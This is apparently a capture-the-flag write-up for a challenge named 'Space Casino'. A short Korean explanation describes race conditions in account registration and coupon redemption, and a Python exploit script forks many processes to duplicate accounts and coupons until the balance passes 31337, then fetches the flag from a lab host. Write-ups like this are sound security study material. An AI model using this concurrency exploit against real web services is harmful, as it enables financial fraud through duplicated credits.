# Space Casino

# Usage

# Concept
- Race Condition

# Writeup

회원가입에서 race condition을 발생시키면 동일한 userid의 계정이 여러 개 생성되므로 userid에 대한 쿠폰 역시 여러 개 발행된다

쿠폰 사용에서 race condition을 발생시키면 하나의 쿠폰으로 의도된 1000캐시보다 많은 돈을 얻을 수 있다

위 두 취약점을 같이 사용하면 목표 금액인 31337을 넘은 돈을 가질 수 있다

### ex.py

```python
import os
import requests
import re

url = "http://prob:5000"

userid = os.urandom(8).hex()
password = os.urandom(8).hex()

a = os.fork()
b = os.fork()
c = os.fork()
d = os.fork()
e = os.fork()

requests.post(url + "/register", data={"userid": userid, "password": password})

if a == 0 or b == 0 or c == 0 or d == 0 or e == 0:
    exit()

s = requests.Session()
s.post(url + "/login", data={"userid": userid, "password": password})
session = s.cookies['session']
coupons = requests.get(url + "/coupons", cookies={'session': session}).text
coupons = re.findall(r'<td><a href="/coupons/(.*?)">Welcome Coupon', coupons)

for coupon in coupons:
    a = os.fork()
    b = os.fork()
    c = os.fork()
    d = os.fork()
    e = os.fork()
    requests.get(url + f"/coupons/{coupon}", cookies={'session': session})
    if a == 0 or b == 0 or c == 0 or d == 0 or e == 0:
        exit()

flag = requests.get(url + "/flag", cookies={'session': session}).text
print(flag)
```